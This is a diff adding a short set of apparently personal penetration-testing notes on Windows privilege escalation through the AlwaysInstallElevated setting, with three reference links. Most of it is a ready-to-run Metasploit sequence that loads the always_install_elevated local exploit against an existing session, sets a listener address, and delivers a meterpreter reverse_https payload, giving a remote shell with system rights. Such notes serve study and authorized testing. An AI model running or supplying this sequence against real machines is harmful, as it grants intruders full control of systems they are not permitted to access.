@@ -1,0 +1,19 @@
+If have permission you can get system access
+
+https://github.com/KINGSABRI/MSI-AlwaysInstallElevated?tab=readme-ov-file
+https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/
+https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook/blob/master/Notes/AlwaysInstallElevated.md
+
+
+If have msf session 
+    use exploit/windows/local/always_install_elevated
+
+    set lhost 192.168.45.151
+
+    set session 1
+
+    set payload windows/x64/meterpreter/reverse_https
+
+    set EXITFUNC thread (must do this process wont work)
+
+    run 
